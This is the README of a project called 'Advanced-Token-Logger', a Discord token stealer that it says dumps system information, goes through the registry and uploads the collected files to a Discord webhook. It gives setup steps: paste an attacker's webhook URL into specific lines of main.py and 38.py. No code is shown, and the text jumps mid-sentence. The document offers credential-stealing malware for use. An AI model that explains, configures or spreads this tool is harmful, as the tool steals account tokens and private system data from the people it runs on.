# Advanced-Token-Logger
An advanced discord token logger that dumps system information, goes through the registry, and more.
Once the script is executed and all info is collected, the files will be sent and uploaded through a

the webhook is created, we are going to paste our webhook in specific areas in the code.

In the file "main.py" go to line 49 and replace the text with your discord webhook url.

In the file "38.py" go to line 7 and replace the text with your discord webhook url.

In the file "38.py" go to line 76 and replace the text with your discord webhook url.
